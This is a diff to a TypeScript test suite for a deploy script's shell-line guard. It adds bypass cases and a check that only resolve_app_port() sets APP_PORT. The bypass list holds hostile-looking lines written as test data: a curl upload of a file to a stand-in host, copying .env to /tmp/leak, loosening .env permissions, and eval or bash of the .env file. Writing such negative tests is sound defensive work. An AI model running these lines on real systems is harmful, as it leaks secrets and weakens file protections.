@@ -5115,13 +5115,24 @@ const MENTION_BYPASSES: ReadonlyArray<{ label: string; line: string }> = [
   { label: 'a process substitution', line: 'diff <(cat "${APP_DIR}/.env") /dev/null' },
   { label: 'an eval of the file contents', line: 'eval "$(cat "${APP_DIR}/.env")"' },
   { label: 'a trailing execution after a legitimate reader', line: 'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")"; bash "${APP_DIR}/.env"' },
+  // The three below carry NO hazard at all — `curl`, `chmod` and `cp` are not interpreters and
+  // there is no substitution or redirect in any of them. Each is caught by the ANCHORING alone:
+  // unanchored, each fragment-matches a shape the scripts really do use (a path assignment, a
+  // lockdown, the one reader) and the rest of the compound command is never looked at. They are
+  // what makes `^…$` load-bearing rather than decorative.
+  { label: 'a path assignment with the file exfiltrated after it', line: 'DEPLOY_META_FILE="${APP_DIR}/.deploy-meta" && curl -T "${DEPLOY_META_FILE}" https://example.invalid' },
+  { label: 'a file test that then loosens the file mode', line: '[[ -f "${APP_DIR}/.env" ]] && chmod 644 "${APP_DIR}/.env"' },
+  { label: 'the one reader with a copy of the file appended', line: 'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")" && cp "${APP_DIR}/.env" /tmp/leak' },
 ]
 
 test('the declared-shape guard rejects every known way past it', () => {
-  // MUTATION ROUTE: drop the `^…$` anchoring from MENTION_SHAPES (match on `shape.match.test`
-  // against the untrimmed line, which is exactly what r26 did) and the first, second, third,
-  // fifth, eighth and thirteenth cases below all pass classification. Drop MENTION_HAZARDS and
-  // the substitution and interpreter cases pass. Verified by making both changes locally.
+  // MUTATION ROUTE, each verified by making the change locally and re-running:
+  //   drop the `^…$` anchoring from MENTION_SHAPES (match anywhere on the line, which is exactly
+  //     what r26 did) and the last three cases pass classification — they carry no hazard, so
+  //     the anchoring is the only thing rejecting them;
+  //   drop MENTION_HAZARDS and the substitution, interpreter, redirect and backtick cases pass;
+  //   narrow APP_OWNED_PATH back to the braced spellings and the two unbraced cases are not even
+  //     seen by the scan.
   const accepted = MENTION_BYPASSES.filter((bypass) => classifyMention(bypass.line) === null).map(
     (bypass) => `${bypass.label}: ${bypass.line}`,
   )
@@ -5465,6 +5476,49 @@ test('the port gate refuses an .env that names a port the service does not liste
     assert.equal(ok.status, 0, `.env saying '${agreeing}' must pass:\n${ok.output}`)
     assert.match(ok.output, /^INFO: Health checks will poll port 3000, from app\.service's own ExecStart=/m, 'and the run must say where the port came from')
   }
+})
+
+test('nothing but resolve_app_port() may decide the port update.sh polls', () => {
+  // THE HEADLINE FINDING, AS A STRUCTURAL INVARIANT. The gate tests below catch a .env that
+  // DISAGREES with the unit; they cannot catch a change that makes .env the source again, because
+  // then the two agree by construction and the gate is satisfied. What has to hold is narrower and
+  // checkable: APP_PORT is written by resolve_app_port() and by nothing else, and no assignment to
+  // it anywhere takes the value read out of the application-owned file.
+  //
+  // MUTATION ROUTE: add `APP_PORT="${ENV_FILE_APP_PORT:-3000}"` anywhere in update.sh — which is
+  // r26's behaviour restored — and this fails naming that line.
+  const source = UPDATE_LINES.join('\n')
+  const resolver = shellFunction(source, 'resolve_app_port')
+  const outside = source.split(resolver)
+  assert.equal(outside.length, 2, 'precondition: resolve_app_port() was found exactly once')
+
+  const assignments = outside
+    .join('\n')
+    .split(/\r?\n/)
+    .filter(isCode)
+    // shellCodeOnly, because two refusal messages QUOTE the name (`…says APP_PORT=…`) and a scan
+    // that cannot tell a quoted mention from an assignment reports the message as one.
+    .filter((line) => /(^|[\s;&|(])APP_PORT=/.test(shellCodeOnly(line)))
+  assert.deepEqual(
+    assignments.map((line) => line.trim()),
+    ['APP_PORT=""'],
+    `outside resolve_app_port() the only thing that may touch APP_PORT is its declaration:\n${assignments.join('\n')}`,
+  )
+
+  // And inside the resolver, the value comes from the invocation or from the unit — never the file.
+  assert.deepEqual(
+    resolver
+      .split(/\r?\n/)
+      .filter((line) => /^\s*APP_PORT=/.test(line))
+      .map((line) => line.trim()),
+    ['APP_PORT=""', 'APP_PORT="${IMS_APP_PORT}"', 'APP_PORT="${UNIT_PORT}"'],
+    'resolve_app_port() must take the port from the invocation or from the unit, and from nothing else',
+  )
+
+  // PRECONDITION, so the enumeration above is not passing over a script that never uses the name:
+  // the health URL and the listener probe are both built out of it.
+  assert.match(source, /curl -fsS --max-time 5 "http:\/\/127\.0\.0\.1:\$\{APP_PORT\}\/api\/health"/, 'the health poll must use it')
+  assert.match(source, /awk -v p=":\$\{APP_PORT\}\\\$"/, 'and so must the listener probe')
 })
 
 test('the port gate runs after an existing fence is adopted and before anything new is touched', () => {
